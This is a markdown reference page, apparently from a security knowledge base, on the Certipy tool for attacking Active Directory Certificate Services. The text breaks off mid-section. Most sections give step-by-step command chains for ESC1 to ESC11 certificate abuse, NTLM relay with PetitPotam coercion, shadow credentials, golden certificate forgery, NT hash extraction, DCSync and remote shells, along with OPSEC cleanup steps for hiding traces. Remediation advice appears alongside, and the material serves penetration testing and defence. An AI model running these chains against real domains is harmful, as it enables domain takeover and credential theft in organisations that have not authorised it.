---
title: "Certipy - Official Documentation Reference"
category: "tools"
tags: ["adcs", "certificates", "active-directory", "certipy"]
last_updated: "2025-12-27"
---

# Certipy - Official Documentation Reference

Source: https://github.com/ly4k/Certipy

## Table of Contents

- [Overview](#overview)
- [Installation and Requirements](#installation-and-requirements)
- [Authentication Methods](#authentication-methods)
- [Finding Vulnerable Templates](#finding-vulnerable-templates)
- [ESC1: Misconfigured Certificate Templates](#esc1-misconfigured-certificate-templates)
- [ESC2: Any Purpose EKU](#esc2-any-purpose-eku)
- [ESC3: Enrollment Agent Templates](#esc3-enrollment-agent-templates)
- [ESC4: Vulnerable Template ACLs](#esc4-vulnerable-template-acls)
- [ESC5: Vulnerable PKI Object ACLs](#esc5-vulnerable-pki-object-acls)
- [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2](#esc6-editf_attributesubjectaltname2)
- [ESC7: Vulnerable CA ACLs](#esc7-vulnerable-ca-acls)
- [ESC8: NTLM Relay to AD CS HTTP Endpoints](#esc8-ntlm-relay-to-ad-cs-http-endpoints)
- [ESC9: No Security Extension](#esc9-no-security-extension)
- [ESC10: Weak Certificate Mappings](#esc10-weak-certificate-mappings)
- [ESC11: NTLM Relay to ICPR RPC](#esc11-ntlm-relay-to-icpr-rpc)
- [Certificate Request and Retrieval](#certificate-request-and-retrieval)
- [Authentication Using Certificates](#authentication-using-certificates)
- [Shadow Credentials Attack](#shadow-credentials-attack)
- [Golden Certificate Attack](#golden-certificate-attack)
- [Certificate Template Abuse](#certificate-template-abuse)
- [Relay Attacks with Certificates](#relay-attacks-with-certificates)
- [Practical ADCS Attack Chains](#practical-adcs-attack-chains)
- [Certificate Management](#certificate-management)
- [BloodHound Integration](#bloodhound-integration)
- [Command Reference](#command-reference)
- [References](#references)

---

## Overview

Certipy is an offensive Python tool for enumerating and abusing Active Directory Certificate Services (AD CS). It was created by ly4k (Oliver Lyak) and is the primary tool for exploiting certificate-based attacks in Active Directory environments.

**Key Capabilities:**
- Enumerate AD CS infrastructure, CAs, and certificate templates
- Identify vulnerable certificate templates (ESC1-ESC11)
- Request certificates with arbitrary Subject Alternative Names (SANs)
- Authenticate using certificates via PKINIT
- Retrieve NT hashes via User-to-User (U2U) Kerberos extension
- Perform Golden Certificate attacks for persistence
- Execute Shadow Credentials attacks
- Relay NTLM authentication to AD CS endpoints

**Output Formats:**
- JSON files with detailed enumeration data
- BloodHound CE compatible ZIP files
- PFX files (PKCS#12) containing certificates and private keys
- Kerberos credential cache files (.ccache)
- Kerberos tickets in Mimikatz format (.kirbi)

---

## Installation and Requirements

### Requirements

- Python 3.9+
- Network access to Active Directory domain controller
- Valid domain credentials (username/password, NTLM hash, or Kerberos ticket)

### Installation via pip (Recommended)

```bash
# Install from PyPI
pip install certipy-ad

# Upgrade to latest version
pip install certipy-ad --upgrade
```

**Note:** The package name is `certipy-ad` (not `certipy`) to avoid conflicts with other packages.

### Installation from Source

```bash
# Clone repository
git clone https://github.com/ly4k/Certipy.git
cd Certipy

# Install
pip install .

# Or install in development mode
pip install -e .
```

### Kali Linux Installation

```bash
# Certipy is available in Kali repositories
sudo apt update
sudo apt install certipy-ad
```

### Docker Installation

```bash
# Build Docker image
docker build -t certipy .

# Run with Docker
docker run -it certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1
```

### Dependencies

Certipy depends on the following Python packages (installed automatically):
- impacket
- ldap3
- pyasn1
- cryptography
- dnspython

---

## Authentication Methods

Certipy supports multiple authentication methods for all commands.

### Password Authentication

```bash
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1
```

### NTLM Hash Authentication

```bash
# Full hash (LM:NT)
certipy find -u user@domain.local -hashes aad3b435b51404ee:aad3b435b51404ee -dc-ip 10.10.10.1

# NT hash only
certipy find -u user@domain.local -hashes :aad3b435b51404ee -dc-ip 10.10.10.1
```

### Kerberos Authentication

```bash
# Using ccache file
export KRB5CCNAME=user.ccache
certipy find -u user@domain.local -k -dc-ip 10.10.10.1

# With specific KDC/target
certipy find -u user@domain.local -k -dc-ip 10.10.10.1 -target dc01.domain.local
```

### Certificate Authentication

```bash
# Use PFX certificate for authentication
certipy find -u user@domain.local -pfx user.pfx -dc-ip 10.10.10.1
```

---

## Finding Vulnerable Templates

The `find` command enumerates AD CS infrastructure and identifies vulnerable configurations.

### Basic Enumeration

```bash
# Find all CAs and templates (outputs JSON + BloodHound ZIP)
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1

# Human-readable text output
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -text

# JSON output only
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -json

# Specify output filename prefix
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -output adcs_enum
```

### Vulnerable Templates Only

```bash
# Only show templates with known vulnerabilities
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# Combine with text output
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable -text
```

### Output Files Generated

| File | Description |
|------|-------------|
| `*_Certipy.json` | Detailed enumeration data in JSON format |
| `*_Certipy.txt` | Human-readable summary (with `-text` flag) |
| `*_Certipy.zip` | BloodHound CE compatible import data |

### Information Retrieved

The enumeration reveals:
- Enterprise CAs and their configurations
- Certificate templates and their settings
- Template permissions (enrollment rights, write access)
- CA permissions (ManageCA, ManageCertificates)
- Web enrollment endpoints (HTTP/HTTPS)
- Vulnerable configurations (ESC1-ESC11)
- EDITF_ATTRIBUTESUBJECTALTNAME2 flag status

### Example CA Information Output

```
CA Name:                CORP-DC-CA
DNS Name:               ca.domain.local
Certificate Subject:    CN=CORP-DC-CA, DC=domain, DC=local
Certificate Serial:     1234567890ABCDEF
Certificate Validity:   2020-01-01 to 2025-01-01
Web Enrollment:         Enabled (http://ca.domain.local/certsrv)
User Specified SAN:     Disabled (Enabled = ESC6)
Request Disposition:    Issue (Pending = Manager Approval)
Permissions:
  - DOMAIN\Domain Admins: ManageCA, ManageCertificates
  - DOMAIN\Authenticated Users: Enroll
```

### Template Analysis Checklist

**Critical Flags to Check:**

| Flag | Security Impact |
|------|----------------|
| `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` | ESC1 - Allows SAN specification in request |
| `CT_FLAG_NO_SECURITY_EXTENSION` | ESC9 - No security OID embedded in certificate |
| `CT_FLAG_PEND_ALL_REQUESTS` | Safer - Requires manager approval |

**Important EKUs:**

| EKU | OID | Security Implication |
|-----|-----|---------------------|
| Client Authentication | 1.3.6.1.5.5.7.3.2 | Allows PKINIT authentication |
| Smart Card Logon | 1.3.6.1.4.1.311.20.2.2 | Allows smart card authentication |
| PKINIT Client Auth | 1.3.6.1.5.2.3.4 | Allows Kerberos PKINIT |
| Any Purpose | 2.5.29.37.0 | All uses allowed (ESC2) |
| Certificate Request Agent | 1.3.6.1.4.1.311.20.2.1 | ESC3 enrollment agent |
| (No EKU) | - | SubCA certificate, all uses (ESC2) |

---

## ESC1: Misconfigured Certificate Templates

**Vulnerability:** Template allows requesters to specify a Subject Alternative Name (SAN), enabling impersonation of any user including Domain Admins.

### Requirements for ESC1

- Enterprise CA grants low-privileged users enrollment rights
- Manager approval is disabled (`CT_FLAG_PEND_ALL_REQUESTS` not set)
- No authorized signatures required
- Template allows SAN in request (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set)
- Template has EKU that allows authentication (Client Auth, PKINIT, Smart Card Logon)

### Exploitation

```bash
# Step 1: Find vulnerable templates
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# Step 2: Request certificate with target's UPN
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'VulnerableTemplate' -upn administrator@domain.local

# Step 3: Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### Request with DNS SAN (for Computer Accounts)

```bash
# Request certificate with target computer's DNS
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'VulnerableTemplate' -dns dc01.domain.local
```

### Output

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Certificate has SAN: administrator@domain.local
[*] Saved certificate to 'administrator.pfx'
```

### Remediation

- Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag from templates
- Enable manager approval for sensitive templates
- Restrict enrollment permissions to required users/groups only
- Use certificate mapping that validates SAN against AD attributes
- Audit templates regularly for misconfigurations

---

## ESC2: Any Purpose EKU

**Vulnerability:** Template has "Any Purpose" EKU or no EKU (SubCA), allowing the certificate to be used for any purpose including client authentication.

### Exploitation

```bash
# Request certificate with Any Purpose EKU
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'AnyPurposeTemplate'

# Use for authentication (as yourself, unless ESC1 conditions also exist)
certipy auth -pfx user.pfx -dc-ip 10.10.10.1
```

### SubCA Template Abuse

If a SubCA template is available:
```bash
# Request SubCA certificate (may require approval)
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'SubCA'
```

### Remediation

- Avoid "Any Purpose" EKU in production templates
- Specify explicit EKUs based on actual requirements
- Audit templates with SubCA or blank EKU
- Remove unnecessary SubCA templates

---

## ESC3: Enrollment Agent Templates

**Vulnerability:** Two-stage attack using Certificate Request Agent EKU to request certificates on behalf of other users.

### Requirements for ESC3

1. Template with Certificate Request Agent EKU, enrollable by attacker
2. Second template that:
   - Allows enrollment agents to enroll on behalf of others
   - Has authentication EKU
   - Doesn't require manager approval

### Exploitation

```bash
# Step 1: Request enrollment agent certificate
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'EnrollmentAgent'

# Step 2: Use enrollment agent cert to request cert for target user
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'User' -on-behalf-of 'DOMAIN\administrator' \
    -pfx enrollment_agent.pfx

# Step 3: Authenticate as target user
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### Remediation

- Restrict enrollment agent templates to specific security groups
- Configure "Restrict enrollment agents" on the CA
- Monitor Certificate Request Agent EKU usage
- Limit which templates allow enrollment on behalf of others

---

## ESC4: Vulnerable Template ACLs

**Vulnerability:** Low-privileged users have write permissions on certificate templates, allowing template modification to enable other attacks (typically ESC1).

### Dangerous Permissions on Templates

| Permission | Impact |
|-----------|--------|
| `Owner` | Full control over template |
| `FullControl` | Can modify all properties |
| `WriteOwner` | Can take ownership |
| `WriteDacl` | Can modify permissions |
| `WriteProperty` | Can modify template attributes |
| `GenericAll` | Full control |
| `GenericWrite` | Write access to all properties |

### Exploitation

```bash
# Step 1: Find templates with vulnerable ACLs
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# Step 2: Modify template to enable ESC1 (saves original config)
certipy template -u user@domain.local -p 'Password123' \
    -template 'VulnerableTemplate' -save-old

# Step 3: Template is now vulnerable to ESC1 - request cert with SAN
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'VulnerableTemplate' -upn administrator@domain.local

# Step 4: Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 5: Restore original template configuration (OPSEC)
certipy template -u user@domain.local -p 'Password123' \
    -template 'VulnerableTemplate' -configuration old_config.json
```

### Template Modification Details

The `certipy template` command modifies the template to:
- Enable `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
- Set appropriate EKUs for authentication
- Disable manager approval if enabled

### Remediation

- Audit template ACLs regularly
- Remove unnecessary write permissions
- Restrict template management to dedicated PKI administrators
- Use Protected Users group where applicable

---

## ESC5: Vulnerable PKI Object ACLs

**Vulnerability:** Write access to PKI-related AD objects (CA server, RootCA container, etc.) can lead to privilege escalation through various means.

### Vulnerable Objects

| Object | Impact if Compromised |
|--------|----------------------|
| CA computer object | Compromise CA server |
| CA server's RPC/DCOM server | Remote code execution |
| NTAuthCertificates container | Add rogue CAs |
| Enrollment Services container | Modify enrollment settings |
| Certificate Templates container | Modify/add templates |

### Exploitation

Various attacks depending on which object is compromised:

```bash
# Example: If you have write access to NTAuthCertificates
# You can add your own CA certificate to the trusted list
# Then forge certificates that will be trusted by the domain

# Check for vulnerable ACLs in certipy output
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable
```

### Remediation

- Audit PKI object ACLs
- Restrict write access to PKI administrators only
- Monitor changes to PKI containers
- Enable auditing on sensitive PKI objects

---

## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

**Vulnerability:** CA configured with `EDITF_ATTRIBUTESUBJECTALTNAME2` flag, allowing SAN specification in any certificate request regardless of template configuration.

### Detection

```bash
# Check if flag is enabled (in certipy find output)
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -text

# Look for: "User Specified SAN: Enabled"
```

### Exploitation

```bash
# Request ANY template with SAN (even if template doesn't allow it)
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'User' -upn administrator@domain.local

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### Remediation

```powershell
# Check current setting
certutil -config "CA-Server\CA-Name" -getreg policy\EditFlags

# Remove the flag from CA configuration
certutil -config "CA-Server\CA-Name" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

# Restart certificate services
net stop certsvc && net start certsvc
```

---

## ESC7: Vulnerable CA ACLs

**Vulnerability:** Low-privileged users have dangerous permissions on the CA itself, allowing CA configuration changes or certificate issuance approval.

### Dangerous CA Permissions

| Permission | Capability |
|-----------|-----------|
| `ManageCA` | Modify CA configuration, add officers, enable templates |
| `ManageCertificates` | Approve/deny pending certificate requests (Officer role) |

### Exploitation (ManageCA + ManageCertificates)

```bash
# Step 1: Add yourself as officer (requires ManageCA)
certipy ca -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' -add-officer user

# Step 2: Enable SubCA template (requires ManageCA)
certipy ca -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -enable-template 'SubCA'

# Step 3: Request SubCA certificate (will be pending due to template settings)
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'SubCA' -upn administrator@domain.local

# Note the Request ID from output

# Step 4: Approve your own request (requires ManageCertificates/Officer)
certipy ca -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -issue-request <request_id>

# Step 5: Retrieve the issued certificate
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -retrieve <request_id>

# Step 6: Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### Exploitation (ManageCA Only)

If you only have ManageCA:
```bash
# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag (creates ESC6)
certipy ca -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' -enable-san

# Now exploit via ESC6
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'User' -upn administrator@domain.local
```

### Remediation

- Audit CA permissions regularly
- Separate ManageCA and ManageCertificates roles
- Restrict these permissions to dedicated PKI administrators
- Monitor CA configuration changes

---

## ESC8: NTLM Relay to AD CS HTTP Endpoints

**Vulnerability:** AD CS HTTP enrollment endpoints (Web Enrollment, CES) are vulnerable to NTLM relay attacks when EPA (Extended Protection for Authentication) is not enabled.

### Prerequisites

- AD CS with HTTP enrollment enabled
- Ability to coerce authentication from a target (e.g., PetitPotam, PrinterBug, DFSCoerce)
- Target machine's NTLM authentication can be relayed

### Exploitation

```bash
# Terminal 1: Start Certipy relay listener
certipy relay -ca ca.domain.local -template 'DomainController'

# Terminal 2: Coerce authentication from target (e.g., using PetitPotam)
python3 PetitPotam.py <attacker_ip> dc01.domain.local

# Certificate is automatically requested and saved when authentication is relayed
# Output: dc01.pfx

# Authenticate with the certificate
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
```

### Relay Options

```bash
# Specify different template
certipy relay -ca ca.domain.local -template 'Machine'

# Specify target port
certipy relay -ca ca.domain.local -template 'DomainController' -port 80

# Use HTTPS
certipy relay -ca ca.domain.local -template 'DomainController' -ssl
```

### Coercion Methods

| Method | Description |
|--------|-------------|
| PetitPotam | EfsRpc coercion (MS-EFSRPC) |
| PrinterBug | Spooler service coercion (MS-RPRN) |
| DFSCoerce | DFS coercion (MS-DFSNM) |
| ShadowCoerce | VSS coercion |

### Remediation

- Enable EPA (Extended Protection for Authentication) on IIS
- Disable NTLM authentication on AD CS endpoints
- Require HTTPS with channel binding
- Disable unnecessary HTTP enrollment endpoints
- Disable Web Enrollment if not needed

---

## ESC9: No Security Extension

**Vulnerability:** When `StrongCertificateBindingEnforcement` is not set to 2 (full enforcement), and a template has `CT_FLAG_NO_SECURITY_EXTENSION`, the `szOID_NTDS_CA_SECURITY_EXT` extension is not embedded in the certificate, allowing certificate mapping bypass.

### Requirements

- `StrongCertificateBindingEnforcement` registry value is 0 or 1 (not 2)
- Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag set
- Attacker has ability to modify target user's `userPrincipalName` (GenericWrite)

### Exploitation

```bash
# Step 1: Modify victim's UPN to target's UPN (requires GenericWrite on victim account)
# Using Certipy's shadow command or other tools like bloodyAD

# Step 2: Request certificate as victim with vulnerable template
certipy req -u victim@domain.local -p 'VictimPass' -ca 'CORP-DC-CA' \
    -template 'VulnerableTemplate'

# Step 3: Restore victim's UPN to original value

# Step 4: Authenticate - certificate maps to target due to UPN in cert
certipy auth -pfx victim.pfx -dc-ip 10.10.10.1
```

### Remediation

- Set `StrongCertificateBindingEnforcement` to 2 (Full enforcement mode)
- Remove `CT_FLAG_NO_SECURITY_EXTENSION` from templates
- Audit templates for this flag

---

## ESC10: Weak Certificate Mappings

**Vulnerability:** Weak certificate mappings (`CertificateMappingMethods` includes UPN or S4U2Self methods) allow impersonation when attacker can modify a user's UPN.

### Scenarios

**Scenario A:** GenericWrite on target, weak mapping enabled
**Scenario B:** GenericWrite on any account, UPN not set

### Exploitation

```bash
# Scenario: You have GenericWrite on a user account

# Step 1: Request certificate as victim
certipy req -u victim@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'User'

# Step 2: Change victim's UPN to target's UPN (using bloodyAD, PowerView, etc.)

# Step 3: Authenticate with certificate (maps to new UPN = target)
certipy auth -pfx victim.pfx -dc-ip 10.10.10.1
```

### Remediation

- Use strong certificate mapping methods
- Set `StrongCertificateBindingEnforcement` to 2
- Disable weak mapping methods in registry
- Restrict GenericWrite permissions on user objects

---

## ESC11: NTLM Relay to ICPR RPC

**Vulnerability:** `IF_ENFORCEENCRYPTICERTREQUEST` flag not set on CA, allowing NTLM relay to the RPC certificate enrollment endpoint (ICPR) instead of HTTP.

### Exploitation

```bash
# Start relay targeting RPC endpoint
certipy relay -ca ca.domain.local -template 'Machine'

# Coerce authentication from DC
python3 PetitPotam.py <attacker_ip> dc01.domain.local

# Certificate will be requested via RPC
```

### Remediation

- Enable `IF_ENFORCEENCRYPTICERTREQUEST` on CA
- Require RPC encryption for certificate requests

---

## Certificate Request and Retrieval

### Basic Certificate Request

```bash
# Request certificate using a template
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'User'
```

### Request with Subject Alternative Name (ESC1/ESC6)

```bash
# Request with UPN SAN (for users)
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'VulnTemplate' -upn administrator@domain.local

# Request with DNS SAN (for computers)
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'VulnTemplate' -dns dc01.domain.local
```

### Request on Behalf Of (ESC3)

```bash
# Use enrollment agent certificate to request on behalf of another user
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'User' -on-behalf-of 'DOMAIN\administrator' \
    -pfx enrollment_agent.pfx
```

### Handling Pending Requests

```bash
# If request requires manager approval, note the Request ID
# After approval (or using ESC7 to self-approve), retrieve the certificate:
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -retrieve <request_id>
```

### Request with NTLM Hash

```bash
certipy req -u user@domain.local -hashes :aad3b435b51404ee -ca 'CORP-DC-CA' \
    -template 'User'
```

### Request with Kerberos

```bash
export KRB5CCNAME=user.ccache
certipy req -u user@domain.local -k -ca 'CORP-DC-CA' -template 'User'
```

---

## Authentication Using Certificates

### Authenticate and Retrieve NT Hash

```bash
# Standard authentication (uses U2U + PKINIT)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Output:
# [*] Using principal: administrator@domain.local
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to administrator.ccache
# [*] Using Kerberos U2U to get NT hash
# [*] Got NT hash for administrator@domain.local: aad3b435b51404ee
```

### Get TGT Only (No Hash Retrieval)

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -no-hash

# Output saved to administrator.ccache
```

### Specify Principal/Domain

```bash
# When certificate principal differs from auth target
certipy auth -pfx cert.pfx -dc-ip 10.10.10.1 \
    -username administrator -domain domain.local
```

### LDAP Shell

```bash
# Get interactive LDAP shell for post-exploitation
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```

### Pass-the-Certificate with Impacket

```bash
# Get TGT
certipy auth -pfx admin.pfx -dc-ip 10.10.10.1 -no-hash

# Use TGT with Impacket tools
export KRB5CCNAME=administrator.ccache

# Dump secrets
secretsdump.py -k -no-pass dc01.domain.local

# Get shell
psexec.py -k -no-pass dc01.domain.local

# WMI execution
wmiexec.py -k -no-pass dc01.domain.local
```

### How PKINIT Authentication Works

1. Client presents certificate to KDC during AS-REQ
2. KDC validates certificate chain and extracts UPN/SAN
3. KDC issues TGT for the authenticated principal
4. Client can use TGT for Kerberos service tickets

### U2U Hash Extraction

Certipy uses User-to-User (U2U) Kerberos extension to retrieve the NT hash:

1. Request TGT using certificate
2. Request U2U service ticket to self (S4U2Self)
3. Decrypt ticket using session key
4. Extract NT hash from PAC (Privilege Attribute Certificate)

---

## Shadow Credentials Attack

**Vulnerability:** Attacker with write access to `msDS-KeyCredentialLink` attribute can add their own key credential and authenticate via PKINIT without knowing the password.

### Prerequisites

- GenericWrite, GenericAll, or specific write access to target's `msDS-KeyCredentialLink`
- Target account must not be a Protected User
- Domain functional level 2016 or higher

### Adding Shadow Credentials

```bash
# Add shadow credentials to target account
certipy shadow auto -u attacker@domain.local -p 'Password123' \
    -account victim
```

### Full Attack Chain

```bash
# Step 1: Add shadow credential and get certificate
certipy shadow auto -u attacker@domain.local -p 'Password123' \
    -account victim

# Output includes:
# - victim.pfx (certificate + key)
# - Device ID for cleanup

# Step 2: Authenticate with certificate
certipy auth -pfx victim.pfx -dc-ip 10.10.10.1

# Step 3: Clean up (important for OPSEC!)
certipy shadow clear -u attacker@domain.local -p 'Password123' \
    -account victim -device-id <device_id>
```

### Shadow Credential Commands

```bash
# Add shadow credential
certipy shadow add -u attacker@domain.local -p 'Password123' -account victim

# List shadow credentials
certipy shadow list -u attacker@domain.local -p 'Password123' -account victim

# Remove specific shadow credential
certipy shadow remove -u attacker@domain.local -p 'Password123' \
    -account victim -device-id <device_id>

# Clear all shadow credentials
certipy shadow clear -u attacker@domain.local -p 'Password123' -account victim

# Auto mode (add, auth, clean in one command)
certipy shadow auto -u attacker@domain.local -p 'Password123' -account victim
```

### Remediation

- Monitor modifications to `msDS-KeyCredentialLink` attribute
- Restrict write permissions on user/computer objects
- Enable logging for PKINIT authentication
- Use Protected Users group for sensitive accounts

---

## Golden Certificate Attack

**Vulnerability:** With access to the CA's private key and certificate, an attacker can forge any certificate, providing persistent domain access similar to a Golden Ticket.

### Prerequisites

- CA administrator access OR
- CA private key obtained through other means (backup, memory dump, etc.)

### Backup CA Certificate and Key

```bash
# Backup CA certificate and private key (requires CA admin access)
certipy ca -u admin@domain.local -p 'Password123' -ca 'CORP-DC-CA' -backup

# Output: ca.pfx containing CA certificate and private key
```

### Forge Certificates

```bash
# Forge certificate for any user
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local \
    -subject 'CN=Administrator,CN=Users,DC=domain,DC=local'

# Output: administrator_forged.pfx

# Forge certificate for computer account
certipy forge -ca-pfx ca.pfx -dns dc01.domain.local \
    -subject 'CN=DC01,OU=Domain Controllers,DC=domain,DC=local'
```

### Authenticate with Forged Certificate

```bash
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```

### Forge Options

```bash
# Specify validity period
certipy forge -ca-pfx ca.pfx -upn admin@domain.local \
    -subject 'CN=Admin,CN=Users,DC=domain,DC=local' \
    -validity-period 365

# Specify serial number
certipy forge -ca-pfx ca.pfx -upn admin@domain.local \
    -subject 'CN=Admin,CN=Users,DC=domain,DC=local' \
    -serial 123456789
```

### Remediation

- Protect CA private key with HSM (Hardware Security Module)
- Monitor CA backup operations
- Restrict CA administrator access
- If CA is compromised, rotate the CA certificate (major undertaking)
- Implement certificate transparency/monitoring

---

## Certificate Template Abuse

### Modifying Templates (ESC4)

```bash
# Modify template to enable ESC1 conditions
certipy template -u user@domain.local -p 'Password123' \
    -template 'VulnerableTemplate' -save-old

# View saved configuration
cat VulnerableTemplate.json

# Restore original configuration
certipy template -u user@domain.local -p 'Password123' \
    -template 'VulnerableTemplate' -configuration VulnerableTemplate.json
```

### Template Configuration Options

```bash
# Set specific configuration
certipy template -u user@domain.local -p 'Password123' \
    -template 'VulnerableTemplate' \
    -property 'msPKI-Certificate-Name-Flag' -value 1
```

### CA Management

```bash
# Add officer (ManageCertificates permission)
certipy ca -u admin@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -add-officer username

# Enable template on CA
certipy ca -u admin@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -enable-template 'TemplateName'

# Disable template on CA
certipy ca -u admin@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -disable-template 'TemplateName'

# Issue pending request
certipy ca -u admin@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -issue-request <request_id>

# Deny pending request
certipy ca -u admin@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -deny-request <request_id>

# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (creates ESC6)
certipy ca -u admin@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -enable-san
```

---

## Relay Attacks with Certificates

### HTTP Relay (ESC8)

```bash
# Basic relay
certipy relay -ca ca.domain.local

# Specify template
certipy relay -ca ca.domain.local -template 'DomainController'

# Specify template for machine accounts
certipy relay -ca ca.domain.local -template 'Machine'
```

### Relay Options

```bash
# Listen on specific interface
certipy relay -ca ca.domain.local -interface 192.168.1.100

# Use specific port
certipy relay -ca ca.domain.local -port 80

# Use SSL/TLS
certipy relay -ca ca.domain.local -ssl
```

### Combining with Coercion

```bash
# Terminal 1: Start relay
certipy relay -ca ca.domain.local -template 'DomainController'

# Terminal 2: Coerce authentication (choose one)
# PetitPotam
python3 PetitPotam.py <attacker_ip> <target>

# PrinterBug
python3 printerbug.py domain.local/user:pass@<target> <attacker_ip>

# DFSCoerce
python3 dfscoerce.py -u user -p pass -d domain.local <attacker_ip> <target>
```

---

## Practical ADCS Attack Chains

### Complete ESC1 Attack Chain

```bash
# 1. Enumerate AD CS and find vulnerable templates
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable -text

# 2. Request certificate impersonating Domain Admin
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'VulnTemplate' -upn administrator@domain.local

# 3. Authenticate and get NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# 4. Use hash with Impacket
secretsdump.py -hashes :aad3b435b51404ee domain.local/administrator@dc01
```

### ESC4 to Domain Admin

```bash
# 1. Find templates with write permissions
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# 2. Modify template (save original for restoration)
certipy template -u user@domain.local -p 'Password123' \
    -template 'VulnTemplate' -save-old

# 3. Request certificate as DA
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'VulnTemplate' -upn administrator@domain.local

# 4. Restore original template (OPSEC)
certipy template -u user@domain.local -p 'Password123' \
    -template 'VulnTemplate' -configuration VulnTemplate.json

# 5. Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### ESC7 Self-Approval Chain

```bash
# 1. Add yourself as officer
certipy ca -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' -add-officer user

# 2. Enable SubCA template
certipy ca -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -enable-template 'SubCA'

# 3. Request certificate (will be pending)
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'SubCA' -upn administrator@domain.local
# Note the Request ID

# 4. Approve your own request
certipy ca -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -issue-request <request_id>

# 5. Retrieve certificate
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -retrieve <request_id>

# 6. Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### ESC8 NTLM Relay to Domain Controller

```bash
# 1. Start relay listener
certipy relay -ca ca.domain.local -template 'DomainController'

# 2. Coerce DC authentication (from another terminal)
python3 PetitPotam.py <attacker_ip> dc01.domain.local

# 3. Certificate is automatically obtained
# 4. Authenticate with DC certificate
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1

# 5. DCSync (using the DC's credentials)
secretsdump.py -hashes :<dc_hash> domain.local/dc01\$@dc01.domain.local
```

### Shadow Credentials to Domain Admin

```bash
# Requires GenericWrite on a Domain Admin account

# 1. Add shadow credential and get certificate
